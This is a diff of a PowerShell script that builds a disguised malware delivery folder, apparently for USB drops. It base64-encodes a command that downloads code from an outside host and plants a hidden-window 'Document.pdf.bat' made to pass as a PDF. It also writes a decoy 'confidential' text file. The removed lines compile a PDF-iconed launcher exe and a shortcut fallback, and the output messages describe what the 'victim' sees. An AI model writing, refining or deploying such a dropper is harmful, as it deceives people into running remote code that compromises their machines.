@@ -7,8 +7,6 @@ $rawCmd = "`$wc=New-Object Net.WebClient;`$b=`$wc.DownloadData('https://allseein
 $encBytes = [System.Text.Encoding]::Unicode.GetBytes($rawCmd)
 $encCmd = [Convert]::ToBase64String($encBytes)
 
-# Keep $encCmd for Run.bat; launcher gets the plain command
-
 if (!$Path) {
     $Path = Read-Host "Enter target path (USB drive or folder)"
     if (!$Path) { Write-Error "No path provided"; exit 1 }
@@ -19,68 +17,9 @@ if (!(Test-Path $Path)) { Write-Error "Path does not exist: $Path"; exit 1 }
 
 Write-Output "Generating payload in: $Path"
 
-# --- Extract PDF icon ---
-$tmpDir = "$env:TEMP\ico_$(Get-Random)"
-New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
-
-$tempPdf = "$tmpDir\_.pdf"
-Set-Content $tempPdf "%PDF-1.4" -Encoding Ascii
-
-Add-Type -AssemblyName System.Drawing
-$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($tempPdf)
-$icoPath = "$tmpDir\pdf.ico"
-$fs = New-Object System.IO.FileStream($icoPath, [System.IO.FileMode]::Create)
-$icon.Save($fs)
-$fs.Close()
-$icon.Dispose()
-Remove-Item $tempPdf -Force
-Write-Output "  [+] PDF icon extracted"
-
-# --- Create launcher.rc ---
-Set-Content "$tmpDir\launcher.rc" '101 ICON "pdf.ico"' -Encoding Ascii
-
-# --- Create launcher.cpp ---
-$cpp = '#include <windows.h>'
-$cpp += "`r`nint WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {"
-$cpp += "`r`n    WinExec(`"powershell -w h -Enc $encCmd`", SW_HIDE);"
-$cpp += "`r`n    return 0;"
-$cpp += "`r`n}"
-Set-Content "$tmpDir\launcher.cpp" $cpp -Encoding Ascii
-
-# --- Compile ---
-$oldPath = $env:Path
-$env:Path = "C:\msys64\ucrt64\bin;" + $env:Path
-$compile = windres "$tmpDir\launcher.rc" -O coff -o "$tmpDir\launcher.res" 2>&1
-if ($LASTEXITCODE -eq 0) {
-    g++ -static -Os -s -mwindows "$tmpDir\launcher.cpp" "$tmpDir\launcher.res" -o "$Path\Document.pdf.exe" 2>&1
-    Remove-Item "$tmpDir\launcher.res" -Force
-}
-$env:Path = $oldPath
-
-if ($LASTEXITCODE -ne 0) {
-    Write-Error "Compilation failed - g++ may not be installed"
-    $shell = New-Object -ComObject WScript.Shell
-    $lnk = $shell.CreateShortcut("$Path\Document.pdf.lnk")
-    $lnk.TargetPath = "powershell.exe"
-    $lnk.Arguments = "-w h -Enc $encCmd"
-    $lnk.WorkingDirectory = "%TEMP%"
-    $lnk.WindowStyle = 7
-    $lnk.IconLocation = "%SystemRoot%\system32\shell32.dll, 70"
-    $lnk.Save()
-    Write-Output "  [+] Document.pdf.lnk created (fallback)"
-} else {
-    Write-Output "  [+] Document.pdf.exe compiled"
-}
-
-# Clean up temp
-Remove-Item "$tmpDir\launcher.cpp" -Force -ErrorAction SilentlyContinue
-Remove-Item "$tmpDir\launcher.rc" -Force -ErrorAction SilentlyContinue
-Remove-Item $icoPath -Force -ErrorAction SilentlyContinue
-Remove-Item $tmpDir -Force -ErrorAction SilentlyContinue
-
-# Run.bat (bypasses launcher issues)
-Set-Content "$Path\Run.bat" "@echo off`r`npowershell -w h -Enc $encCmd" -Encoding ASCII
-Write-Output "  [+] Run.bat created"
+# Document.pdf.bat (shows as Document.pdf with extensions hidden)
+Set-Content "$Path\Document.pdf.bat" "@echo off`r`npowershell -w h -Enc $encCmd" -Encoding ASCII
+Write-Output "  [+] Document.pdf.bat created"
 
 # Decoy Document.txt
 Set-Content "$Path\Document.txt" "This document contains confidential information.`r`nFor authorized personnel only.`r`n`r`nPlease review and sign the attached agreement." -Encoding UTF8
@@ -93,7 +32,7 @@ Write-Output "  [+] README.txt created"
 # Optional zip
 if ($Zip) {
     $zipFiles = @()
-    foreach ($f in @("Document.pdf.exe", "Document.pdf.lnk", "Document.txt", "README.txt")) {
+    foreach ($f in @("Document.pdf.bat", "Document.txt", "README.txt")) {
         $fp = "$Path\$f"
         if (Test-Path $fp) { $zipFiles += $fp }
     }
@@ -108,12 +47,6 @@ if ($Zip) {
 Write-Output ""
 Write-Output "=== DELIVERY SUMMARY ==="
 Write-Output "Folder: $Path"
-if (Test-Path "$Path\Document.pdf.exe") {
-    Write-Output "Payload: Document.pdf.exe (no arrow, real PDF icon)"
-    Write-Output "Victim sees: Document.pdf (clicks it -> payload fires)"
-} elseif (Test-Path "$Path\Document.pdf.lnk") {
-    Write-Output "Payload: Document.pdf.lnk (PDF icon, has shortcut arrow)"
-    Write-Output "Victim sees: Document.pdf (shortcut)"
-}
+Write-Output "Batch:  Document.pdf.bat (shows as Document.pdf with extensions hidden)"
 if ($Zip -and (Test-Path "$Path\Document.zip")) { Write-Output "Zipped: Document.zip" }
 Write-Output "=========================="
